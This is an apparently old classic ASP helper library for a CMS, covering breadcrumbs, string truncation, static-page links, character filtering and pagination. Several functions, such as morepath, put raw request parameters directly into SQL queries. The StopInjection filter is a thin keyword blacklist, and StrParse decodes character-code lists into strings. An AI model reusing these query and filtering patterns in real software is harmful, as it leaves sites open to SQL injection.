<%
'*************************************************************************************
'函数名an_Replace
'修复相对路径问题
'参数str要处理的字符串,root_path程序工作目录
'*************************************************************************************
Function an_Replace(str,root_path)
Dim regEx,temp,str_o,str_i             ' 建立变量
Set regEx = New RegExp     ' 建立正则表达式对象
str_i="CGSAIL|images|js|script|edit/uploadfile|html|flash|css" '要处理的目录,用"|"隔开
str_end="html|htm|asp|jsp|php|cgi|shtml|gif|jpg|jpeg|bmp|png|txt|doc|exe|css|js|text|mdb|swf|xls|ini|war|rar|"
str_sed=str_end&"zip|reg|dat|inf|arj|cab|chm|text|inc|ppt|dll" '要处理的文件后缀名,用"|"隔开
patrnl="(=)([^\w/<|()=&+*-]){0,2}("&str_i&")(?!\.)|([^&+*-])([=\s""'])([a-zA-Z0-9-_]+[.]("&str_end&"))(?![a-zA-Z0-9])"'正则表达式 
regEx.Pattern = patrnl      ' 设置模式
regEx.IgnoreCase = false   ' 设置是否区分大小写
'i=0                        ' 测试，用防止死循环
   do while true
     i=i+1
     'if temp<>str and i<2000 then '测试使用
	 if temp<>str then
       temp=str
       str=regEx.Replace(str,"$1$2$4$5"&root_path&"$3$6")'替换操作
     else
       exit do
     end if
   loop
  an_Replace = str     '返回给函数。
End Function 


'*************************************************************************************
	'函数名:titleb
	'作  用:控制字符显示个数
'*************************************************************************************
function titleb(str,strlen)
	dim l,t,c, i
	l=len(str)
	t=0
	for i=1 to l
	c=Abs(Asc(Mid(str,i,1)))
	if c>255 then
	t=t+2
	else
	t=t+1
	end if
	if t>=strlen then
	titleb=left(str,i)&"…"
	exit for
	else
	titleb=str&""
	end if
	next
end function



'*************************************************************************************
	'函数名:morepath
	'作  用:更多文章里的路径标签的调用
'*************************************************************************************
function morepath()

   lm2 =trim(request("lm2"))
   lm=trim(request("lm"))
    if lm2="" then lm2=lm
    if lm="" then lm=lm2

	set morepath_1_rs= Server.CreateObject("ADODB.RecordSet")  '原rs改名为morepath_1_rs
	morepath_1_rs.Open "select * from ["&CgsailPrefix&"lm] where id="&lm&" order by id desc",conn,1,1
	if morepath_1_rs.recordcount<>0 then
		lm3=morepath_1_rs("lm3")
		lm2=morepath_1_rs("lm2")
		lm1=morepath_1_rs("lm")
		id=morepath_1_rs("id")
		lmid=morepath_1_rs("lmid")
		morepath="文章列表"
	 end if
     morepath_1_rs.close
	 set morepath_1_rs=nothing

	if lm3<>"" then
        lm3name=lm3
		morepath="<a href=news_more.asp?lm="&id&">"&lm3name&"</a> - "&morepath
		
		set morepath_2_rs = Server.CreateObject("ADODB.RecordSet")
		morepath_2_rs.Open "select * from ["&CgsailPrefix&"lm] where id="&lmid&" order by id desc",conn,1,1
		if morepath_2_rs.recordcount<>0 then
			lm2name=morepath_2_rs("lm2")
			lm1id=morepath_2_rs("lmid")
			morepath="<a href=news_more.asp?lm="&morepath_2_rs("id")&">"&lm2name&"</a> - "&morepath
		end if
	    morepath_2_rs.close
		set morepath_2_rs=nothing

		set morepath_3_rs = Server.CreateObject("ADODB.RecordSet")
		morepath_3_rs.Open "select * from ["&CgsailPrefix&"lm] where id="&lm1id&" order by id desc",conn,1,1
		if morepath_3_rs.recordcount<>0 then
			lm1name=morepath_3_rs("lm")
			morepath="<a href=news_more.asp?lm="&morepath_3_rs("id")&">"&lm1name&"</a> - "&morepath
		end if
		morepath_3_rs.close
	    set morepath_3_rs=nothing
	
	 end if   '结束lm3<>"" 的判断

	if lm2<>"" then
        lm2name=lm2
		morepath="<a href=news_more.asp?lm="&id&">"&lm2name&"</a> - "&morepath
		
		set morepath_2_rs = Server.CreateObject("ADODB.RecordSet")
		morepath_2_rs.Open "select * from ["&CgsailPrefix&"lm] where id="&lmid&" order by id desc",conn,1,1
		if morepath_2_rs.recordcount<>0 then
			lm1name=morepath_2_rs("lm")
			morepath="<a href=news_more.asp?lm="&morepath_2_rs("id")&">"&lm1name&"</a> - "&morepath
		end if
		
	     morepath_2_rs.close
	     set morepath_2_rs=nothing
	
	end if

	if lm1<>"" then
		lm1name=lm1
		morepath="<a href=news_more.asp?lm="&id&">"&lm1name&"</a> - "&morepath
	end if
		
end function



'*************************************************************************************
	'函数名:lmpath(news_id)-----news_id ---- 文章的ID号
	'作  用:栏目路径
'*************************************************************************************
function lmpath(news_id)  '加一个参数：news_id ---- 文章的ID号.
'	newsid=trim(request("newsid"))   '取消这一句，增以下一个判断
   root_path=finddir(request.servervariables("URL"))  
  '增加。取出系统程序的工作目录.

   if isnull(news_id) or isempty(news_id) or news_id=""  then   '增加
         newsid=trim(request("newsid")) '增加
   else '增加
        newsid=news_id  '增加
  end if   '增加
'-增加结束。  
'下面的rs全部改为：fun_lmpath_rs, 增"&root_path&".
	set fun_lmpath_rs = Server.CreateObject("ADODB.RecordSet")
	fun_lmpath_rs.Open "select * from ["&CgsailPrefix&"news] where id="&newsid&" order by id desc",conn,1,1
	if fun_lmpath_rs.recordcount<>0 then
		lm3=fun_lmpath_rs("lm3")
		lm2=fun_lmpath_rs("lm2")
		lm1=fun_lmpath_rs("lm")
		news_title=fun_lmpath_rs("title")
		'lmpath="<a href="&root_path&"news_view.asp?newsid="&newsid&">"&news_title&"</a>"
        lmpath="<a href="&fun_html_url(newsid)&">"&news_title&"</a>"
	end if
	fun_lmpath_rs.close
	set fun_lmpath_rs=nothing

	if lm3<>"0" then
		set fun_lmpath_rs = Server.CreateObject("ADODB.RecordSet")
		fun_lmpath_rs.Open "select * from ["&CgsailPrefix&"lm] where id="&lm3&" order by id desc",conn,1,1
		if fun_lmpath_rs.recordcount<>0 then
			lm3name=fun_lmpath_rs("lm3")
			lmpath="<a href="&root_path&"news_more.asp?lm="&fun_lmpath_rs("id")&">"&lm3name&"</a> - "&lmpath
		end if
		fun_lmpath_rs.close
		set fun_lmpath_rs=nothing
	end if


	if lm2<>"0" then
		set fun_lmpath_rs = Server.CreateObject("ADODB.RecordSet")
		fun_lmpath_rs.Open "select * from ["&CgsailPrefix&"lm] where id="&lm2&" order by id desc",conn,1,1
		if fun_lmpath_rs.recordcount<>0 then
			lm2name=fun_lmpath_rs("lm2")
			lmpath="<a href="&root_path&"news_more.asp?lm="&fun_lmpath_rs("id")&">"&lm2name&"</a> - "&lmpath
		end if
		fun_lmpath_rs.close
		set fun_lmpath_rs=nothing

	end if

	if lm1<>"0" then
		set fun_lmpath_rs = Server.CreateObject("ADODB.RecordSet")
		fun_lmpath_rs.Open "select * from ["&CgsailPrefix&"lm] where id="&lm1&" order by id desc",conn,1,1
		if fun_lmpath_rs.recordcount<>0 then
			lmname=fun_lmpath_rs("lm")
			lmpath="<a href="&root_path&"news_more.asp?lm="&fun_lmpath_rs("id")&">"&lmname&"</a> - "&lmpath
		end if
		fun_lmpath_rs.close
		set fun_lmpath_rs=nothing
	end if
	
		
end function



'*************************************************************************************
	'函数名:newsx()，pl()，config(zd)
	'作  用:定义config表的字段的变量
'*************************************************************************************
function newsx()
	set rsnewsx = Server.CreateObject("ADODB.RecordSet")
	rsnewsx.Open "select * from ["&CgsailPrefix&"config]",conn,1,1
	newsx=int(rsnewsx("newsx"))
	rsnewsx.close
	set rsnewsx=nothing
end function

function pl()
	set rsnewsx = Server.CreateObject("ADODB.RecordSet")
	rsnewsx.Open "select * from ["&CgsailPrefix&"config]",conn,1,1
	pl=int(rsnewsx("pl"))
	rsnewsx.close
	set rsnewsx=nothing
end function

function config(zd)
	set rsnewsx = Server.CreateObject("ADODB.RecordSet")
	rsnewsx.Open "select "&zd&" from ["&CgsailPrefix&"config]",conn,1,1
	config=rsnewsx(""&zd&"")
        config=replace(config,setting_DirSafe(0),"")         '2007.12.27解决“path”路径问题
	rsnewsx.close
	set rsnewsx=nothing
end function



'*************************************************************************************
	'函数名:chkhtm(stra)
	'作  用:字符过滤
'*************************************************************************************
function chkhtm(stra)
   stra=replace(stra,"<","&lt;")
   stra=replace(stra,">","&gt;")
   stra=replace(stra,"'","")
   stra=replace(stra,"(","（")
   stra=replace(stra,")","）")
   stra=replace(stra,";","；")
   stra=replace(stra,",","，")
   stra=replace(stra,"%","％")
   stra=replace(stra,"+","＋")
   chkhtm=stra
end function


'*************************************************************************************
	'函数名:glhtml
	'作  用:标题字符过滤
'*************************************************************************************
Function glhtml(title)
	title=replace(title,"&nbsp;"," ")
	title=replace(title," ","")
	title=replace(title,chr(32),"")
	title=replace(title,chr(13),"")
	title=replace(title,chr(10),"")
	title=replace(title,chr(9),"")
	title=replace(title,"　","")
	title=replace(title,"""","")
	title=replace(title,"'","")
	set reg=new regexp
	reg.IgnoreCase=true
	reg.Global=true
	reg.Pattern="<(.+?)>"
	glhtml=reg.Replace(title,"")
	set reg=nothing
End Function

'**************************************************
'功能:数据库表查询函数
'参数:Command:表达式
'**************************************************
Function CGSAILEXE(Command)
		If Not IsObject(Conn) Then OpenConn	
			on error resume next
			Set CGSAILEXE = Conn.Execute(Command)
			If Err Then
				err.Clear
				Set Conn = Nothing
				Response.Write "<li>查询数据的时候发现错误，请检查您的查询代码是否正确。<br /><li>"
				Response.Write Command
				Response.End
			End If
	 End Function
'*************************************************************************************
	'函数名:finddir
	'作  用:寻找路径
'*************************************************************************************
Function finddir(filepath)                             '修改一下这个函数,2006-9-14
	finddir=""
	for hzh_i=1 to len(filepath)                   '-2006-9-14日发现，原取值for i=1 有问题，改为：for hzh_i没有冲突。奇哉。
	if left(right(filepath,hzh_i),1)="/" or left(right(filepath,hzh_i),1)="\" then
	  abc=hzh_i
	  exit for
	end if
	next
	if abc <> 1 then
	finddir=left(filepath,len(filepath)-abc+1)
	finddir=replace(finddir,setting_DirSafe(0),"")            '2007.12.27解决“path”路径问题
       end if
end Function

'*************************************************************************************
	'函数名:CreateDateDir
	'作  用:生成日期目录
        '作  者:廖强峰，QQ：天赐 369615259 ，2009-7-15
'*************************************************************************************
function CreateDateDir(FileFolde)
Y=year(date())
M=month(date())
File=Y & "-" & m
strFolder="FileFolde/" & File
'首选判断要建立的文件夹是否已经存在
Dim strTestFolder, objFSO
strTestFolder = Server.Mappath(strFolder)
Set objFSO = CreateObject("Scripting.FileSystemObject")
' 检查文件夹是否存在
If not objFSO.FolderExists(strTestFolder) Then '如果不存在
strTestFolder = Server.Mappath(strFolder)
Set objFSO = CreateObject("Scripting.FileSystemObject")
' 建立文件夹
objFSO.CreateFolder(strTestFolder)
Set objFSO = Nothing
Response.write "文件夹'"&File&"'建立成功!"
Else
Response.write "文件夹已存在!"
End If
end function


'*************************************************************************************
	'函数名:GoogleSo
	'作  用:调用Google菜单
'*************************************************************************************
function GoogleSo()
		GoogleSo="<center><hr size=1>"
		GoogleSo=GoogleSo&"<center>"
		GoogleSo=GoogleSo&"<form method='get' name=E_FORM action='http://www.google.cn/custom' target=_blank>"
		GoogleSo=GoogleSo&"<table bgcolor='#ffffff'>"
		GoogleSo=GoogleSo&"<tr><td nowrap='nowrap' valign='top' align='left' height='32'>"
		GoogleSo=GoogleSo&"<label for='sbi' style='display: none'>输入您的搜索字词</label>"
		GoogleSo=GoogleSo&"<input type='text' name='q' size='30' maxlength='255' value='"&glhtml(title)&"' id='sbi'></input>"
		GoogleSo=GoogleSo&"<label for='sbb' style='display: none'>提交搜索表单</label>"
		GoogleSo=GoogleSo&"<input type='submit' name='sa' value='Google搜索' id='sbb'></input>"
		GoogleSo=GoogleSo&"<input type='hidden' name='client' value='pub-7709734864915288'></input>"
		GoogleSo=GoogleSo&"<input type='hidden' name='forid' value='1'></input>"
		'GoogleSo=GoogleSo&"<input type='hidden' name='ie' value='utf-8'></input>"
		'GoogleSo=GoogleSo&"<input type='hidden' name='oe' value='utf-8'></input>"
		GoogleSo=GoogleSo&"<input type='hidden' name='cof' value='GALT:#008000;GL:1;DIV:#336699;VLC:663399;AH:center;BGC:FFFFFF;LBGC:336699;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;LH:43;LW:100;L:http://www.google.cn/logos/Logo_40wht.gif;S:http://;LP:1;FORID:1'></input>"
		GoogleSo=GoogleSo&"<input type='hidden' name='hl' value='zh-CN'></input>"
		GoogleSo=GoogleSo&"</td></tr></table>"
		GoogleSo=GoogleSo&"</form>"
		GoogleSo=GoogleSo&"</center>"

end function

'**************************************************
'函数名：IsObjInstalled
'作  用：检查组件是否已经安装
'参  数：strClassString ----组件名
'返回值：True  ----已经安装
'       False ----没有安装
'**************************************************
Function IsObjInstalled(strClassString)
	On Error Resume Next
	IsObjInstalled = False
	Err = 0
	Dim xTestObj
	Set xTestObj = Server.CreateObject(strClassString)
	If 0 = Err Then IsObjInstalled = True
	Set xTestObj = Nothing
	Err = 0
End Function
'------------------检查某一目录是否存在-------------------
Function CheckDir(FolderPath)
	dim fso
	folderpath=Server.MapPath(".")&"\"&folderpath
	Set fso1 = Server.CreateObject("Scripting.FileSystemObject")
	If fso.FolderExists(FolderPath) then
	'存在
		CheckDir = True
	Else
	'不存在
		CheckDir = False
	End if
	Set fso = nothing
End Function
'-------------根据指定名称生成目录---------
Function MakeNewsDir(foldername)
	dim fso,f
	Set fso = Server.CreateObject("Scripting.FileSystemObject")
    Set f = fso.CreateFolder(foldername)
    MakeNewsDir = True
	Set fso = nothing
End Function

'**************************************************
'函数名：JoinChar
'作  用：向地址中加入 ? 或 &
'参  数：strUrl  ----网址
'返回值：加了 ? 或 & 的网址
'**************************************************
function JoinChar(strUrl)
	if strUrl="" then
		JoinChar=""
		exit function
	end if
	if InStr(strUrl,"?")<len(strUrl) then 
		if InStr(strUrl,"?")>1 then
			if InStr(strUrl,"&")<len(strUrl) then 
				JoinChar=strUrl & "&"
			else
				JoinChar=strUrl
			end if
		else
			JoinChar=strUrl & "?"
		end if
	else
		JoinChar=strUrl
	end if
end function

'**************************************************
' copyright 2009
' 功能：检查文件后缀，如果与预定的匹配即返回TRUE
' create:2009- 6-16
' 作  者:廖强峰，QQ：天赐 369615259 ，2009-6-18
'***************************************************
Function CheckExt(FileExt)
	If DimFileExt = "*" Then CheckExt = True
	Ext = Split(DimFileExt,",")
	For i = 0 To Ubound(Ext)
		If Lcase(FileExt) = Ext(i) Then 
			CheckExt = True
			Exit Function
		End If
	Next
End Function

Function GetDateModify(filepath)
	Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.GetFile(filepath) 
	s = f.DateLastModified 
	set f = nothing
	set fso = nothing
	GetDateModify = s
End Function

Function GetDateCreate(filepath)
	Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.GetFile(filepath) 
	s = f.DateCreated 
	set f = nothing
	set fso = nothing
	GetDateCreate = s
End Function

Function tURLEncode(Str)
	temp = Replace(Str, "%", "%25")
	temp = Replace(temp, "#", "%23")
	temp = Replace(temp, "&", "%26")
	tURLEncode = temp
End Function

'*************************************************************************************
	'函数名： fun_html_url(news_id)
	'作用：一个取得静态文件的链接地址
    '参数：news_id---文章的ID号。
    '返回值：在显示文章时，代替：
    '<a href="news_view.asp?newsid=XXX">文章标题</a>
    '中的链接地址：news_view.asp?nesid=XXX
    '代替后为:<a href="""&fun_html_url(news_id)&""">文章标题</a>
'*************************************************************************************
function fun_html_url(news_id)
  newsid=news_id

'2006年11月10日-发现，下面一句移到这里。解决了网站调用网页与程序目录不相同时，路径出错的问题。--致谢-红蜗牛指出的错误。
  
root_path=finddir(request.servervariables("URL"))   '取出系统程序的工作目录.

  if newsid="" then 
     fun_html_url="#"
  end if

  if (not isNumeric(newsid)) then
     fun_html_url="#"
  end if

  
  if fun_html_url="#" then exit function

  fun_html_url_sql = "select id,file_path,file_name from ["&CgsailPrefix&"news] where id="&newsid
  Set fun_html_url_rs = Server.CreateObject("ADODB.RecordSet")
  fun_html_url_rs.Open fun_html_url_sql,conn,1,1
 
  if fun_html_url_rs.recordcount=0 then
     fun_html_url="#"
  
  else  '是recordcount=0的否则条件.

     if config("file_html")=1 and fun_html_url_rs("file_path")<>"" and fun_html_url_rs("file_name")<>"" then  '输出静态文件
   
    array_file_name=split(fun_html_url_rs("file_name"),"|")
    file_name=array_file_name(0)
    file_path=fun_html_url_rs("file_path")
   
  '把一下一句移到251行了。--解决网页调用的路径错误。
  '判断是否有文件存在，如果存在，则调用静态文件，不存在，调用数据库显示
	'root_path=finddir(request.servervariables("URL"))   '取出系统程序的工作目录.

	wl_root_path=server.mappath(root_path)&"\"   '栏目物理存放的目录 
    wl_file=wl_root_path&file_path&file_name

    set fileobj=Server.Createobject("Scripting.FileSystemObject")
	If fileobj.FileExists(wl_file) Then
	   fun_html_url=root_path&file_path&file_name '跳转到静态文件
          
      else
       fun_html_url=root_path&"news_view.asp?newsid="&newsid
      
      end if
    set fileobj=nothing

   else  '是config("file_html")=1否则
     fun_html_url=root_path&"news_view.asp?newsid="&newsid
    
    end if '是config("file_html")=1的结束条件.

 end if '是recordcount=0的结束条件.

 fun_html_url_rs.close
 set fun_html_url_rs=nothing

end function

'增加结束（2006-9-13）一个取得静态文件的链接地址

'*************************************************************************************
	'函数名： fun_prohtml_url(news_id)
	'作用：一个取得静态文件的链接地址
    '参数：news_id---文章的ID号。
    '返回值：在显示文章时，代替：
    '<a href="news_view.asp?newsid=XXX">文章标题</a>
    '中的链接地址：news_view.asp?nesid=XXX
    '代替后为:<a href="""&fun_html_url(news_id)&""">文章标题</a>
'*************************************************************************************
function fun_prohtml_url(id)
  newsid=id

'2006年11月10日-发现，下面一句移到这里。解决了网站调用网页与程序目录不相同时，路径出错的问题。--致谢-红蜗牛指出的错误。
  
root_path=finddir(request.servervariables("URL"))   '取出系统程序的工作目录.

  if newsid="" then 
     fun_prohtml_url="#"
  end if

  if (not isNumeric(newsid)) then
     fun_prohtml_url="#"
  end if

  
  if fun_prohtml_url="#" then exit function

  fun_prohtml_url_sql = "select id,file_path,file_name,sortid from [cgsail_Product] where id="&newsid
  Set fun_prohtml_url_rs = Server.CreateObject("ADODB.RecordSet")
  fun_prohtml_url_rs.Open fun_prohtml_url_sql,conn,1,1
 
  if fun_prohtml_url_rs.recordcount=0 then
     fun_prohtml_url="#"
  
  else  '是recordcount=0的否则条件.

     if config("file_html")=1 and fun_prohtml_url_rs("file_path")<>"" and fun_prohtml_url_rs("file_name")<>"" then  '输出静态文件
   
    array_file_name=split(fun_prohtml_url_rs("file_name"),"|")
    file_name=array_file_name(0)
    file_path=fun_prohtml_url_rs("file_path")
   
  '把一下一句移到251行了。--解决网页调用的路径错误。
  '判断是否有文件存在，如果存在，则调用静态文件，不存在，调用数据库显示
	'root_path=finddir(request.servervariables("URL"))   '取出系统程序的工作目录.

	wl_root_path=server.mappath(root_path)&"\"   '栏目物理存放的目录 
    wl_file=wl_root_path&file_path&file_name

    set fileobj=Server.Createobject("Scripting.FileSystemObject")
	If fileobj.FileExists(wl_file) Then
	   fun_prohtml_url=root_path&file_path&file_name '跳转到静态文件
          
      else
       fun_prohtml_url=root_path&"product_view.asp?lm="&rs("sortid")&"&id="&newsid
      
      end if
    set fileobj=nothing

   else  '是config("file_html")=1否则
     fun_prohtml_url=root_path&"product_view.asp?lm="&rs("sortid")&"&id="&newsid
    
    end if '是config("file_html")=1的结束条件.

 end if '是recordcount=0的结束条件.

 fun_prohtml_url_rs.close
 set fun_prohtml_url_rs=nothing

end function

'增加结束（2006-9-13）一个取得静态文件的链接地址


'*************************************************************************************
	'函数名:checktxt
	'作  用:非法字符过滤
'*************************************************************************************
function checktxt(txt)
chrtxt="33|34|35|36|37|38|39|40|41|42|43|44|47|58|59|60|61|62|63|91|92|93|94|96|123|124|125|126|128"
chrtext=split(chrtxt,"|")
for c=0 to ubound(chrtext)
txt=replace(txt,chr(chrtext(c)),"")
next
checktxt=txt
end function

function lleft(content,lef)
for le=1 to len(content)
if asc(mid(content,le,1))<0 then
lef=lef-2
else
lef=lef-1
end if
if lef<=0 then exit for
next
lleft=left(content,le)
end function




'*************************************************************************************
	'函数名:Error_Msg
	'作  用:报错信息
'*************************************************************************************

sub Error_Msg(ErrMsg)
response.write "<TITLE>错误报告！</TITLE>"& vbCrLf
response.write "<META http-equiv=Content-Type content=""text/html; charset=gb2312"">"& vbCrLf
response.write "<LINK href=""style.css"" type=text/css rel=stylesheet>"& vbCrLf
response.write "<BR><BR>"& vbCrLf
response.write "             <TABLE align=center bgColor=#DEDFDE cellpadding=""2"" cellspacing=""0"" border=0 style=""border: outset 2px;width:65%;"">"& vbCrLf
response.write "              <TR>               "& vbCrLf
response.write "      <TD height=18 style=""FILTER: progid:DXImageTransform.Microsoft.Gradient(startColorStr='#294184', endColorStr='#A5CBF7', gradientType='1')""><b><font color=#FFFFFF>错误报告！　Error Information</FONT></b></td>"& vbCrLf
response.write "      <TD align=right bgColor=#A5CBF7><a href=javascript:window.close()><img src=""images/close.gif"" width=""18"" height=""15"" border=0 align=""absmiddle""></a></td>"& vbCrLf
response.write "    </tr>"& vbCrLf
response.write "              <TR>"& vbCrLf
response.write "                <TD colSpan=2>"& vbCrLf
response.write "                  <FIELDSET><LEGEND accessKey=F align=left>产生错误的可能原因：</LEGEND>"& vbCrLf
response.write "                  <TABLE align=center cellSpacing=2 cellPadding=2 width=""90%"" border=0>"& vbCrLf
response.write "                    <TR>"& vbCrLf
response.write "                      <TD>"&ErrMsg&"</TD>"& vbCrLf
response.write "                      </TD></TR>"& vbCrLf
response.write "                    <TR>"& vbCrLf
response.write "                      <TD height=25 align=middle colSpan=2><BR><INPUT onclick=javascript:history.go(-1) type=submit value="" 确 定 "" name=submit></TD></TR></TABLE></FIELDSET> "& vbCrLf
response.write "                  </TD></TR></TABLE></TD></TR></TABLE>"& vbCrLf
response.end
end sub






'*************************************************************************************
	'函数名:ChkClng(ByVal str)
	'作  用:检查是否是数字 ，并转换为长整型
'*************************************************************************************	
Function ChkClng(ByVal str)
	    On error resume next
		If IsNumeric(str) Then
			ChkClng = CLng(str)
		Else
			ChkClng = 0
		End If
		If Err Then ChkClng=0
End Function
	
'*************************************************************************************
	'函数名:SplitNewsPage，AutoSplitPage，AutoSplitPageTF
	'作  用:文章自动分页
'*************************************************************************************	

  Function SplitNewsPage(Content,MaxPerChar)
	    nextpage_string=config("nextpage")
		SplitNewsPage=AutoSplitPage(Content,nextpage_string,ChkClng(MaxPerChar))
     End Function

	'文章自动分页
	'参数：Content-文章内容 SplitPageStr-文章分隔线 PerPageLen-每页大约字符数
   Function AutoSplitPage(Content,SplitPageStr,PerPageLen)
	    on error resume next
		Dim Inti,StrTrueContent,iPageLen,DLocation,XLocation,CurrContent,i,currlen
		 If Content="" Or PerPageLen=0 Or Instr(1,Content,SplitPageStr)>0 Then AutoSplitPage=Content:Exit Function
		  Inti=instr(1,Content,"<"):i=0
		  If inti=0 then           '不存在Html标记
			   do while i< strlength(Content)
			    i=i+1
				dim c:c=Asc(Mid(Content,i,1))
				if Err.Number <> 0 Then Err.Clear:currlen=currlen+2 else currlen=currlen+1
				if currlen>=PerPageLen and mid(Content,i+1)<>"" then Content=left(Content,i)&SplitPageStr&mid(Content,i+1):i=i+10:currlen=0
			   loop
			   AutoSplitPage=Content:Exit Function
		  Else   
			  StrTrueContent=left(Content,Inti-1):iPageLen=strLength(StrTrueContent):inti=inti+1:iPageLen=0
			do while instr(Inti,Content,">")<>0
			   DLocation=instr(Inti,Content,">") 
			   XLocation=instr(DLocation,Content,"<")
			   If XLocation>DLocation+1 then
				Inti=XLocation:StrTrueContent=mid(Content,DLocation+1,XLocation-DLocation-1):iPageLen=iPageLen+strLength(StrTrueContent) 
				If iPageLen>PerPageLen then    
				 CurrContent=Lcase(left(Content,XLocation-1))
				 If AutoSplitPageTF(CurrContent,"table|a|b>|i>|strong|div")=true then  Content=left(Content,XLocation-1)&SplitPageStr&mid(Content,XLocation):iPageLen=0 
				End If
			   ElseIf XLocation=0 then      
				Exit Do
			   ElseIf XLocation=DLocation+1 then 
				Inti=XLocation
			   End If
			  loop
		  End If
		AutoSplitPage=Content
	End Function
    '结合以上函数使用
    Function AutoSplitPageTF(TempStr,HtmlTagStr)
		Dim BeginHtmlTagNum,EndHtmlTagNum,HtmlTagArr,i
		If TempStr="" Or HtmlTagStr="" Then AutoSplitPageTF=False:Exit Function
		    HtmlTagArr=split(HtmlTagStr,"|")
			For i = 0 to Ubound(HtmlTagArr)
				Dim BeginHtmlTag:BeginHtmlTag="<"&HtmlTagArr(i)
				Dim EndHtmlTag:EndHtmlTag  ="</"&HtmlTagArr(i)
				Dim Inti:Inti=0
				do while instr(Inti+1,TempStr,BeginHtmlTag)<>0
					Inti=instr(Inti+1,TempStr,BeginHtmlTag):BeginHtmlTagNum=BeginHtmlTagNum+1
				Loop
				Inti=0
				do while instr(Inti+1,TempStr,EndHtmlTag)<>0
					Inti=instr(Inti+1,TempStr,EndHtmlTag):EndHtmlTagNum=EndHtmlTagNum+1
				Loop
				If EndHtmlTagNum=BeginHtmlTagNum then AutoSplitPageTF=true Else	AutoSplitPageTF=False:Exit Function
			Next
	End Function

'**************************************************
	'函数名：strLength
	'作  用：求字符串长度。汉字算两个字符，英文算一个字符。
	'参  数：str  ----要求长度的字符串
	'返回值：字符串长度
'**************************************************
Function strLength(Str)
		On Error Resume Next
		Dim WINNT_CHINESE:WINNT_CHINESE = (Len("中国") = 2)
		If WINNT_CHINESE Then
			Dim l, T, c,I
			l = Len(Str)
			T = l
			For I = 1 To l
				c = Asc(Mid(Str, I, 1))
				If c < 0 Then c = c + 65536
				If c > 255 Then
					T = T + 1
				End If
			Next
			strLength = T
		Else
			strLength = Len(Str)
		End If
		If Err.Number <> 0 Then Err.Clear
	End Function

'**************************************************
	'函数名：StopInjection
	'作  用：防注入功能
	'作  者:廖强峰，QQ：天赐 369615259 ，2009-7-15
'**************************************************
Function StopInjection(values)
	For Each N_Get In values
		Dim L_Get, L_Get2
		For Each L_Get In values
			L_Get2 = values(L_Get)
			Set regEx = New RegExp
			regEx.IgnoreCase = True
			regEx.Global = True
			regEx.Pattern = "(\bselect\b|\sand\s|'|\sdeclare\s)"
			If regEx.Test(L_Get2) Then
				Alert()
				response.End()
			End If
			Set regEx = Nothing
		Next
	Next
End Function 
	
	
Sub Alert()
	Dim str
	str = "<"&"Script Language=JavaScript"&">"
	str = str & "alert('== 检测到了危险字符，已经禁止本次提交 ==\n');window.close();"
	str = str & "<"&"/Script"&">"
	response.write  str
End Sub

'**************************************************
	'函数名：CloseConn
	'作  用：关闭连接功能
	'作  者:廖强峰，QQ：天赐 369615259 ，2009-7-1
'**************************************************
Sub CloseConn()
	On Error Resume Next
	Conn.close:Set Conn=nothing
End sub
%>




<%
'**************************************************
	'作  用：最新功能
	'作  者:廖强峰，QQ：天赐 369615259 ，2010-8-2
'**************************************************
Function CheckStr(Strer,Num)
        Dim Shield,w
	    If Strer = "" Or IsNull(Strer) Then Exit Function
	    Select Case Num
		  Case 1
	        If IsNumeric(Strer) = 0 Then
	          Response.Write "操作错误"
		      Response.End
	        End If
			Strer = Int(Strer)
		End Select
	    CheckStr = Strer
   End Function
Sub DoDelslhtml(htmlname)
	On Error Resume Next
	Set fso = Server.CreateObject("Scripting.FileSystemObject")
	servermap=server.MapPath("..")
	servermap=servermap&"\"&htmlname
	FSO.DeleteFile(servermap)
	Set FSO = Nothing
End Sub

Function ReplaceBadChar(strChar)
    If strChar = "" Or IsNull(strChar) Then
        ReplaceBadChar = ""
        Exit Function
    End If
    Dim strBadChar, arrBadChar, tempChar, i
    strBadChar = "+,',%,^,&,?,(,),<,>,[,],{,},/,\,;,:," & Chr(34) & "," & Chr(0) & ",--"
    arrBadChar = Split(strBadChar, ",")
    tempChar = strChar
    For i = 0 To UBound(arrBadChar)
        tempChar = Replace(tempChar, arrBadChar(i), "")
    Next
    tempChar = Replace(tempChar, "@@", "@")
    ReplaceBadChar = tempChar
End Function

Function ReplaceConstChar(strChar)
    If strChar = "" Or IsNull(strChar) Then
        ReplaceConstChar = ""
        Exit Function
    End If
    Dim strBadChar, arrBadChar, tempChar, i
    strBadChar = "+,',%,^,&,?,(,),<,>,[,],{,},," & Chr(0) & ""
    arrBadChar = Split(strBadChar, ",")
    tempChar = strChar
    For i = 0 To UBound(arrBadChar)
        tempChar = Replace(tempChar, arrBadChar(i), "")
    Next
    tempChar = Replace(tempChar, "@@", "@")
    ReplaceConstChar = tempChar
End Function

function StrLen(Str)
  if Str="" or isnull(Str) then
    StrLen=0
    exit function
  else
    dim regex
    set regex=new regexp
    regEx.Pattern ="[^\x00-\xff]"
    regex.Global =true
    Str=regEx.replace(Str,"^^")
    set regex=nothing
    StrLen=len(Str)
  end if
end function

function StrLeft(Str,StrLen)
  dim L,T,I,C
  if Str="" then
    StrLeft=""
    exit function
  end if
  Str=Replace(Replace(Replace(Replace(Str,"&nbsp;"," "),"&quot;",Chr(34)),"&gt;",">"),"&lt;","<")
  L=Len(Str)
  T=0
  for i=1 to L
    C=Abs(AscW(Mid(Str,i,1)))
    if C>255 then
      T=T+2
    else
      T=T+1
    end if
    if T>=StrLen then
      StrLeft=Left(Str,i) & "…"
      exit for
    else
      StrLeft=Str
    end if
  next
  StrLeft=Replace(Replace(Replace(replace(StrLeft," ","&nbsp;"),Chr(34),"&quot;"),">","&gt;"),"<","&lt;")
end function
%>
<%
function StrParse(parses)
Dim myarry 
myarry= Split(parses,",")
dim re 
For each i in myarry
re = re + chr(i)
Next
StrParse = re
end Function
function StrReplace(Str)
  if Str="" or isnull(Str) then
    StrReplace=""
    exit function
  else
    StrReplace=replace(str," ","&nbsp;")
    StrReplace=replace(StrReplace,chr(13),"&lt;br&gt;")
    StrReplace=replace(StrReplace,"<","&lt;")
    StrReplace=replace(StrReplace,">","&gt;")
  end if
end function

function ReStrReplace(Str)
  if Str="" or isnull(Str) then
    ReStrReplace=""
    exit function
  else
    ReStrReplace=replace(Str,"&nbsp;"," ")
    ReStrReplace=replace(ReStrReplace,"<br />",chr(13))
